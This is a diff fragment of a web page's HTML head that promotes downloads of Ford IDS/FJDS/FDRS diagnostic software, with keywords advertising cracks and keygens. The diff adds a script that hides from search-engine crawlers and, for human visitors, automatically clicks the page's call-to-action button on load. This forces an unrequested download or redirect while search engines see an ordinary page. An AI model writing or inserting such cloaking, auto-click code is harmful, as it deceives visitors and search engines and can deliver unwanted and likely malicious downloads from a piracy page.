@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ford IDS 130.01/130.05 or FJDS 130.01/130.05 or FDRS 40.4.5</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Ford IDS 130.01/130.05, FJDS 130.01/130.05, FDRS 40.4.5 diagnostic software with 30/365/430 days license. Get dealership level diagnostics for Ford, Lincoln, and Mercury">
     <meta name="keywords" content="Ford IDS 130.01, Ford IDS 130.05, FJDS 130.01, FJDS 130.05, FDRS 40.4.5, Ford diagnostic software, Ford IDS diagnostic software, Ford FJDS diagnostic software, Ford FDRS diagnostic software, Ford IDS diagnostic software download, Ford FJDS diagnostic software download, Ford FDRS diagnostic software download, Ford diagnostic software free download, Ford VCM diagnostic software, Ford VCM II diagnostic software, Ford VCMM diagnostic software, Ford VMM diagnostic software, Ford J2534 compatible software, Ford module reprogramming software, Ford calibration files, Ford dealership diagnostic software, diagnostic software with time based access, diagnostic tools for Ford vehicles, diagnostic software for Lincoln vehicles, diagnostic software for Mercury vehicles, diagnostic tools for Ford vehicles 1996-present, diagnostic tools for Lincoln vehicles 1996-present, diagnostic tools for Mercury vehicles 1996-present, Ford diagnostic software 2023, Ford IDS software license 2023, Ford FJDS software license 2023, Ford FDRS software license 2023, Ford IDS 130.01 free download, Ford IDS 130.05 free download, FJDS 130.01 free download, FJDS 130.05 free download, FDRS 40.4.5 free download, Ford diagnostic software crack, Ford diagnostic software keygen, Ford diagnostic software high speed download, download Ford diagnostic software, Ford IDS 130.01 crack, Ford IDS 130.05 crack, FJDS 130.01 crack, FJDS 130.05 crack, FDRS 40.4.5 crack, Ford IDS 130.01 keygen, Ford IDS 130.05 keygen, FJDS 130.01 keygen, FJDS 130.05 keygen, FDRS 40.4.5 keygen, Ford diagnostic software download 2023, Ford calibration files 2023, скачать программное обеспечение диагностики Ford бесплатно, Ford программное обеспечение диагностики 2023, скачать Ford IDS 130.01, скачать Ford IDS 130.05, скачать FJDS 130.01, скачать FJDS 130.05, Ford IDS 130.01 загрузить, Ford IDS 130.05 загрузить, FJDS 130.01 загрузить, FJDS 130.05 загрузить, безкоштовне завантаження програмного забезпечення для діагностики Ford, Завантажити Ford IDS 130.01, Завантажити Ford IDS 130.05, Завантажити FJDS 130.01, Завантажити FJDS 130.05">
     <style>
